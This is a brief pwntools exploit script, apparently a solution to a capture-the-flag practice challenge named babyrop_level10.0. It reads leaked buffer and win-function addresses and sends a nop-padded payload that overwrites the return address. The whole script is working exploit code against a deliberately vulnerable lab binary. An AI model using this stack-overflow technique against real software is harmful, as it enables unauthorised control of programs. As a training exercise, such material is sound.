from pwn import *
context.binary = "/challenge/babyrop_level10.0"
p = process()
context.terminal = ['tmux', 'splitw', '-h']
#p = gdb.debug( "/challenge/babyrop_level10.0")
p.recvuntil(b'located at: ')
input_buffer = int(p.recvuntil(b'.').decode().strip('.'),base=16)
log.success("Input buffer: %s", hex(input_buffer))
p.recvuntil(b'constructed at ')
win_function = int(p.recvuntil(b'.').decode().strip('.'),base=16)
log.success("Win function: %s", hex(win_function))
payload = asm('nop') * 96 + p64(win_function)
p.send(payload)
p.interactive()

